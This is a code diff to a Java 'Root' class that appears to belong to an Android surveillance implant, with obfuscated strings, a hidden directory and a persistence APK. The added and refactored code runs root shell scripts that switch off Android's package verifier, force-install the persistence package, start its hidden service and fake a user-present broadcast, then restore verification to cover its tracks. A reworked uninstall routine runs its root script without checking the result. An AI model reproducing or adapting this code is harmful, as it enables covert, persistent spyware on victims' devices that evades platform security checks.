@@ -302,9 +302,10 @@ public class Root {
 		if (apkPath != null) {
 
 			Status.setIconState(false);
-			String script = M.e("#!/system/bin/sh") + "\n";
-			script += M.e("export LD_LIBRARY_PATH=/vendor/lib:/system/lib") + "\n";
+			//String script = M.e("#!/system/bin/sh") + "\n";
+			//script += M.e("export LD_LIBRARY_PATH=/vendor/lib:/system/lib") + "\n";
 			//script += Configuration.shellFile + " qzx \"rm -r " + Path.hidden() + "\"\n";
+			String script = "";
 			if (new AutoFile(Path.hidden()).exists()) {
 				script += M.e("rm -r ") + Path.hidden() + "\n";
 			}
@@ -355,22 +356,12 @@ public class Root {
 				}
 			}
 
-			String filename = "c";
-			if (createScript(filename, script) == false) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (uninstallRoot): failed to create uninstall script"); //$NON-NLS-1$
-				}
-				return false;
+			boolean ret = Execute.executeRootAndForgetScript(script);
+			if(!ret){
+				Utils.sleep(1000);
+				Execute.executeScript(script);
 			}
 
-			Execute ex = new Execute();
-			ExecuteResult result = ex.executeRoot(Status.getAppContext().getFilesDir() + "/" + filename);
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (uninstallRoot) result stdout: %s stderr: %s", StringUtils.join(result.stdout),
-						StringUtils.join(result.stderr));
-			}
-
-			removeScript(filename);
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (uninstallRoot): uninstalled"); //$NON-NLS-1$
@@ -422,6 +413,8 @@ public class Root {
 		Execute.execute(new String[]{Configuration.shellFileBase, "blw"});
 		addOldFileMarkup(String.format(M.e("%s*"), apkPosition.split("-")[0]));
 
+		String packageName = Status.self().getAppContext().getPackageName();
+
 		String perPkg = Status.persistencyApk;
 		String command = M.e("export LD_LIBRARY_PATH=/vendor/lib:/system/lib") + "\n";
 		command += M.e("settings put global package_verifier_enable 0") + "\n";
@@ -431,17 +424,20 @@ public class Root {
 		command += M.e("chmod 644 ") + perPkg + "\n";
 		command += String.format(M.e("[ -s %s ] && pm install -r -f "), perPkg) + perPkg + "\n";
 		command += M.e("sleep 1") + "\n";
-		command += M.e("installed=$(pm list packages ") + Status.self().getAppContext().getPackageName() + ")\n";
+
+		command += M.e("installed=$(pm list packages ") + packageName + ")\n";
 		command += M.e("if [ ${#installed} -gt 0 ]; then") + "\n";
-		command += M.e("am startservice ") + Status.self().getAppContext().getPackageName() + M.e("/.ServiceMain") + "\n";
+		command += M.e("am startservice ") + packageName + M.e("/.ServiceMain") + "\n";
 		command += M.e("am broadcast -a android.intent.action.USER_PRESENT") + "\n";
 		command += M.e("fi") + "\n";
 		command += M.e("sleep 2") + "\n";
 		command += M.e("settings put global package_verifier_enable 1") + "\n";
 		command += M.e("pm enable com.android.vending") + "\n";
 		command += Configuration.shellFileBase + M.e(" blr") + "\n";
+
 		ExecuteResult ret = Execute.executeScript(command);
 
+		Utils.sleep(1000);
 		ExecuteResult pers = Execute.executeRoot(M.e("ls -l ") + perPkg);
 		String persString = pers.getStdout();
 		if (Cfg.DEBUG) {
